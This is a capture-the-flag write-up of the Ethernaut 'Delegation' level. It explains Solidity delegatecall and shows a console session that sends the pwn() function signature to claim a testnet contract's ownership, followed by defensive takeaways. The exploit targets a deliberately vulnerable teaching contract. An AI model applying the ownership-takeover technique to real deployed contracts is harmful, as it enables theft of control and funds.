# Ethernaut Level 6: Delegation Challenge Explained

## What is Delegatecall?

Delegatecall is a low-level function call in Ethereum that allows a contract to invoke functions from another contract while preserving its own context. This means that the calling contract's storage and its `msg.sender`, `msg.value` attributes remain the same even when a function from another contract is invoked.

```solidity
contract A {
    function callDelegate(address delegateAddress, bytes memory data) public {
        delegateAddress.delegatecall(data);
    }
}
```

## How does Delegatecall work?

When Contract A makes a delegatecall to Contract B, it allows Contract B to mutate its storage. This can lead to unintended consequences if Contract B is malicious or if the storage context is unsafe.

```solidity
contract B {
    uint public storageValue;

    function setStorageValue(uint newValue) public {
        storageValue = newValue;
    }
}
```

## The Challenge

In this challenge, you are required to claim ownership of the given instance. The Delegation contract makes a delegatecall to the Delegate contract. The Delegate contract has a function called `pwn()`, which changes the ownership of an `owner` variable to whoever invoked the function. Your task is to invoke this function and become the owner of the contract.

```solidity
contract Delegate {
    address public owner; // Occupies slot 0

    function pwn() public {
        owner = msg.sender; // Save msg.sender to slot 0
    }
}
```

## How to solve the challenge?

You can invoke the `pwn()` function by sending data in a transaction. This can be done using the Remix IDE or the console. Once you successfully invoke the function, you become the owner of the contract.

```javascript
// => Instance address0x2Ac4376062CaC9089D355586D92dF23004FFA43B
// await contract.owner()
// '0xF781b45d11A37c51aabBa1197B61e6397aDf1f78'
// var pwn_signature = web3.utils.keccak256("pwn()");
// undefined
// contract.sendTransaction({data: pwn_signature})
// Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
// 31a04b09021a361c108742307a4879ae8b0d945b.js:1 ⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x22ea068378b441303a98b3cda6cb13ae1140e8ca9236fa268c448ca7d93099bc
// 31a04b09021a361c108742307a4879ae8b0d945b.js:1 ⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x22ea068378b441303a98b3cda6cb13ae1140e8ca9236fa268c448ca7d93099bc
// await contract.owner()
// '0x73103E2C30b52Ac77C138Dc4e3Af42D800DA468F'
```

## Key Takeaways

It's important to use the higher-level `call()` function when inheriting from libraries, especially when you don't need to change contract storage and do not care about gas control. Also, when inheriting from a library intending to alter your contract’s storage, make sure to line up your storage slots with the library’s storage slots to avoid these edge cases. Always authenticate and do conditional checks on functions that invoke delegatecalls.

This challenge is a great way to understand the potential vulnerabilities associated with delegatecalls, which was a core issue in the $30M Parity hack.
